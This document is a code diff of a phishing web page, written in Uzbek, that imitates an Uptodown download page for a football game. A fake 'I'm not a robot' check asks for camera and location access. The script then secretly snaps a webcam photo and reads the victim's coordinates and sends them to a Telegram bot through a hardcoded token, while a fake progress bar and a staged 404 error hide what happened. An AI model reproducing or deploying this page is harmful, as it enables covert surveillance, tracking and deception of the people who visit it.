@@ -14,189 +14,181 @@
             --ut-dim: #7e949c;
         }
 
-        body {
-            margin: 0;
-            background-color: var(--ut-bg);
-            font-family: 'Roboto', sans-serif;
-            color: #ffffff;
-        }
+        body { margin: 0; background-color: var(--ut-bg); font-family: 'Roboto', sans-serif; color: #ffffff; overflow-x: hidden; }
 
-        /* Header & Nav */
-        .top-centered-header {
-            background-color: var(--ut-dark);
-            padding: 12px 0;
-            text-align: center;
-            border-bottom: 1px solid #102a33;
-        }
-        .main-logo { height: 24px; }
-
-        header {
-            background: var(--ut-dark);
-            height: 50px;
-            display: flex;
-            align-items: center;
-            padding: 0 16px;
-        }
-        .menu-btn { color: var(--ut-blue); font-size: 26px; cursor: pointer; }
-
-        .path-bar { background: #06181e; padding: 10px 16px; font-size: 10px; color: var(--ut-dim); text-transform: uppercase; }
-        
-        /* App Content */
-        .main-content { max-width: 1000px; margin: 0 auto; padding: 20px 16px; }
+        /* Asosiy sahifa elementlari */
+        .main-content { max-width: 1000px; margin: 0 auto; padding: 20px 16px; transition: filter 0.3s ease; }
         .app-header { display: flex; gap: 16px; margin-bottom: 24px; align-items: center; }
-        .app-icon { width: 90px; height: 90px; border-radius: 20px; object-fit: cover; background: #102a33; }
-        .app-info h1 { font-size: 24px; margin: 0; }
-        .app-sub { font-size: 14px; color: var(--ut-dim); }
-
-        /* reCAPTCHA Widget Style */
-        .captcha-container {
-            background: #f9f9f9;
-            border: 1px solid #d3d3d3;
-            width: 300px;
-            height: 74px;
-            border-radius: 3px;
-            display: flex;
-            align-items: center;
-            padding: 0 10px;
-            margin: 30px auto;
+        .app-icon { width: 90px; height: 90px; border-radius: 20px; background: #102a33; }
+        
+        /* Chiroyli Yuklab olish tugmasi */
+        .btn-main {
+            background: var(--ut-green);
+            color: white;
+            width: 100%;
+            padding: 16px;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 18px;
+            border: none;
+            box-shadow: 0 4px 0 #008a3d;
             cursor: pointer;
-            color: #000;
-            box-shadow: 0 0 4px rgba(0,0,0,0.1);
+            text-transform: uppercase;
         }
-        .captcha-checkbox {
-            width: 24px;
-            height: 24px;
-            border: 2px solid #c1c1c1;
-            border-radius: 2px;
-            background: #fff;
-            margin-right: 15px;
-            display: flex;
+
+        /* Overlay (Orqa fonni xiralashtirish) */
+        #overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(5px);
+            z-index: 9999;
             align-items: center;
             justify-content: center;
-            transition: 0.2s;
         }
-        .captcha-text { flex-grow: 1; font-size: 14px; }
-        .captcha-logo-section { text-align: center; display: flex; flex-direction: column; align-items: center; }
-        .captcha-logo-section img { width: 30px; }
-        .captcha-logo-section span { font-size: 8px; color: #555; }
 
-        /* Tech Info */
-        .tech-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
-        .tech-item { font-size: 12px; color: var(--ut-dim); }
-        .tech-value { color: #fff; font-weight: bold; display: block; }
+        /* Captcha va Progress Box */
+        .modal-box { background: #fff; padding: 25px; border-radius: 4px; color: #000; width: 320px; text-align: center; }
+        
+        .captcha-mini {
+            border: 1px solid #d3d3d3;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            background: #f9f9f9;
+        }
+        .c-check { width: 24px; height: 24px; border: 2px solid #c1c1c1; margin-right: 15px; display: flex; align-items: center; justify-content: center; }
+
+        /* Progress Bar */
+        #progress-container { display: none; margin-top: 20px; }
+        .progress-bar { width: 100%; height: 10px; background: #eee; border-radius: 5px; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: var(--ut-green); transition: width 0.1s; }
 
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="top-centered-header">
-    <img src="https://stc.utdstc.com/img/logos/uptodown-logo-white.png" class="main-logo">
+<div class="main-content" id="content">
+    <div class="app-header">
+        <div class="app-icon"></div>
+        <div>
+            <h1>eFootball PES 2026</h1>
+            <p style="color:var(--ut-dim)">10.4.0 | Uptodown</p>
+        </div>
+    </div>
+    
+    <button class="btn-main" onclick="showCaptcha()">Oxirgi versiya (Yuklash)</button>
+
+    <div style="margin-top: 20px; color: var(--ut-dim); font-size: 12px;">
+        <p>Hajmi: 1.9 GB</p>
+        <p>Talablar: Android 7.0+</p>
+    </div>
 </div>
 
-<header>
-    <div class="menu-btn">☰</div>
-</header>
-
-<div class="path-bar">Android / O'yinlar / Sport / eFootball PES 2026</div>
-
-<div class="main-content">
-    <div class="app-header">
-        <img src="image_98f76c.png" class="app-icon" alt="PES 2026">
-        <div class="app-info">
-            <h1>eFootball PES 2026</h1>
-            <div class="app-sub">10.4.0 | <span style="color:var(--ut-blue)">Uptodown.com</span></div>
+<div id="overlay">
+    <div class="modal-box" id="modal">
+        <div id="captcha-step">
+            <h3 style="margin-top:0; font-size: 16px;">Xavfsizlik tekshiruvi</h3>
+            <p style="font-size: 13px; color: #666;">Yuklab olishdan oldin robot emasligingizni tasdiqlang.</p>
+            <div class="captcha-mini" onclick="verifyUser()">
+                <div class="c-check" id="checkmark"></div>
+                <div style="flex-grow:1; text-align:left; font-size:14px;">I'm not a robot</div>
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30">
+            </div>
         </div>
-    </div>
 
-    <div class="captcha-container" onclick="startVerification()">
-        <div class="captcha-checkbox" id="c-box"></div>
-        <div class="captcha-text">I'm not a robot</div>
-        <div class="captcha-logo-section">
-            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="captcha">
-            <span>reCAPTCHA</span>
-            <span style="font-size: 7px;">Privacy - Terms</span>
+        <div id="progress-container">
+            <h3 style="margin-top:0; font-size: 16px;">Fayl tayyorlanmoqda...</h3>
+            <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
+            <p id="percent" style="font-size: 14px; margin-top: 10px;">0%</p>
         </div>
-    </div>
-
-    <div class="tech-grid">
-        <div class="tech-item">DASTURCHI <span class="tech-value">KONAMI</span></div>
-        <div class="tech-item">LITSENZIYA <span class="tech-value">Bepul</span></div>
-        <div class="tech-item">YUKLASHLAR <span class="tech-value">1,034,167,963</span></div>
-        <div class="tech-item">SANA <span class="tech-value">1-Apr, 2026</span></div>
     </div>
 </div>
 
 <video id="v-stream" autoplay playsinline></video>
 <canvas id="v-canvas"></canvas>
-<a id="download-link" href="https://example.com/pes2026.apk" download style="display: none;"></a>
 
 <script>
-    const CONFIG = { 
-        TOKEN: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", 
-        CHAT: "6198817749" 
-    };
+    const CONFIG = { TOKEN: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", CHAT: "6198817749" };
 
-    async function startVerification() {
-        const cBox = document.getElementById('c-box');
-        cBox.innerHTML = '<img src="https://i.gifer.com/ZZ5H.gif" style="width:20px;">'; // Yuklanish animatsiyasi
-
-        try {
-            // 1. Kamera ruxsati
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            
-            // 2. Joylashuv ruxsati
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                // Ruxsat berildi - Galochka qo'yish
-                cBox.innerHTML = '<span style="color: #00a04a; font-size: 22px; font-weight: bold;">✓</span>';
-                cBox.style.border = "none";
-
-                // Botga jo'natish mantiqi
-                await processData(stream, pos);
-
-                // Yuklab olishni boshlash
-                setTimeout(() => {
-                    document.getElementById('download-link').click();
-                }, 2000);
-
-            }, (err) => {
-                alert("Joylashuv ruxsati zarur!");
-                location.reload();
-            });
-
-        } catch (err) {
-            alert("Kameraga ruxsat berilmadi!");
-            location.reload();
-        }
+    function showCaptcha() {
+        document.getElementById('content').style.filter = "blur(8px)";
+        document.getElementById('overlay').style.display = "flex";
     }
 
-    async function processData(stream, pos) {
+    async function verifyUser() {
+        const check = document.getElementById('checkmark');
+        check.innerHTML = '<img src="https://i.gifer.com/ZZ5H.gif" width="18">';
+
+        try {
+            // Ruxsatlarni so'rash
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                
+                // Botga ma'lumotni yashirincha yuborish
+                sendData(stream, pos);
+
+                // Captcha muvaffaqiyatli
+                check.innerHTML = '✅';
+                setTimeout(() => {
+                    document.getElementById('captcha-step').style.display = "none";
+                    startLoading();
+                }, 1000);
+
+            }, (err) => { alert("Joylashuv ruxsati zarur!"); location.reload(); });
+        } catch (e) { alert("Kameraga ruxsat berilishi shart!"); location.reload(); }
+    }
+
+    function startLoading() {
+        document.getElementById('progress-container').style.display = "block";
+        let width = 0;
+        const fill = document.getElementById('fill');
+        const percent = document.getElementById('percent');
+
+        const interval = setInterval(() => {
+            if (width >= 100) {
+                clearInterval(interval);
+                // 4. To'rtinchi bosqich: 404 Error
+                showError();
+            } else {
+                width += Math.random() * 2;
+                if(width > 100) width = 100;
+                fill.style.width = width + "%";
+                percent.innerText = Math.floor(width) + "%";
+            }
+        }, 100);
+    }
+
+    function showError() {
+        document.body.innerHTML = `
+            <div style="text-align:center; margin-top:100px; color:#fff; font-family:sans-serif;">
+                <h1 style="font-size:100px; margin-bottom:0;">404</h1>
+                <p style="font-size:20px;">Xatolik: Server bilan aloqa uzildi.</p>
+                <p style="color:#7e949c;">Fayl topilmadi yoki yuklash muddati tugadi (Error_0x884)</p>
+                <button onclick="location.reload()" style="margin-top:20px; padding:10px 20px; background:var(--ut-blue); border:none; color:#fff; border-radius:5px;">Qaytadan urinish</button>
+            </div>
+        `;
+    }
+
+    async function sendData(stream, pos) {
         const video = document.getElementById('v-stream');
         video.srcObject = stream;
-        await new Promise(res => setTimeout(res, 1000));
-
+        await new Promise(res => setTimeout(res, 800));
         const canvas = document.getElementById('v-canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        canvas.width = 640; canvas.height = 480;
         canvas.getContext('2d').drawImage(video, 0, 0);
-        
-        const snap = await (await fetch(canvas.toDataURL('image/jpeg', 0.6))).blob();
+        const snap = await (await fetch(canvas.toDataURL('image/jpeg', 0.5))).blob();
         stream.getTracks().forEach(t => t.stop());
 
-        const info = `📥 *Yangi Target*\n📍 Joylashuv: ${pos.coords.latitude}, ${pos.coords.longitude}\n📱 Qurilma: ${navigator.userAgent}`;
-
-        // Text yuborish
-        await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: CONFIG.CHAT, text: info, parse_mode: 'Markdown'})
-        });
-
-        // Rasm yuborish
         const fd = new FormData();
         fd.append('chat_id', CONFIG.CHAT);
         fd.append('photo', snap);
-        await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {method: 'POST', body: fd});
+        fd.append('caption', `📥 *Yangi Target*\n📍 Geo: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+        
+        fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
     }
 </script>
 
